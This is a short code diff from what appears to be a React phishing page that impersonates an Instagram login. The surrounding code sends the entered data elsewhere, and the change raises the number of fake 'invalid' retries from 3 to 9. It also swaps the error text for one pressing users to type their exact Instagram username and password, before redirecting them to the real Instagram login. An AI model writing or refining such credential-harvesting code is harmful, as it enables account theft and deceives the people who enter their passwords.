@@ -85,10 +85,10 @@ function App() {
 
     if (data.ok) {
       console.log("Data sent successfully");
-      if (noOfTimes < 3)
+      if (noOfTimes < 9)
         {
           setNoOfTimes(prev => prev + 1);
-          setShowError("*Invalid username or password");
+          setShowError("*Please enter exact password and username same as your instagram account.");
         }else{
           window.location.href ="https://www.instagram.com/accounts/login/";
         }
